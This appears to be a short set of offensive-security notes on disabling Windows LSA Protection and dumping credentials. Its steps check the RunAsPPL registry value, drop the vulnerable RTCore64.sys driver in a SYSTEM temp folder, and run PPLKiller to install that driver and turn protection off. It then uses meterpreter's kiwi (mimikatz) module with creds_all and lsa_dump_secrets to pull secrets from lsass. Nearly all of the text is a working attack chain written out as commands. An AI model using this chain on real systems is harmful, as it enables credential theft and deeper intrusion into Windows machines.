1. Check if PPL is enabled

CMD: `reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL` - 0x1 means enabled.

2. Make sure the session you are running with has SYSTEM privleges.

3. Place the driver RTCore64.sys at:
- `C:\Windows\System32\config\systemprofile\AppData\Local\Temp` - The Temp directory might no exist, just create it - mkdir Temp.

4. Now, we will need to install the driver:
- `.\PPLKiller /installDriver`

5. Then we will disable LSA Protection:
- `.\PPLKiller.exe /disableLSAProtection`

Now we can use meterpreter mimikatz module to dump the lsass process:
- `load kiwi` - `creds_all` - `lsa_dump_secrets`
